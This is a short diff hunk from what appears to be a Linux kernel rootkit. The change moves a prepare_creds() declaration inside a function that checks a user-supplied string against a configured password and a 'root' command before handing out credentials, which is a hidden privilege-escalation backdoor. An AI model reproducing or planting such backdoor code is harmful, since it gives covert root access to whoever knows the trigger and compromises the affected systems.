@@ -978,8 +978,8 @@ int execute_command(const char __user *str, size_t length)
     str += sizeof(CFG_PASS);
 
     if (strcmp(str, CFG_ROOT) == 0) {
+	struct cred *creds = prepare_creds();
         pr_info("Got root command\n");
-        struct cred *creds = prepare_creds();
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 5, 0)
         
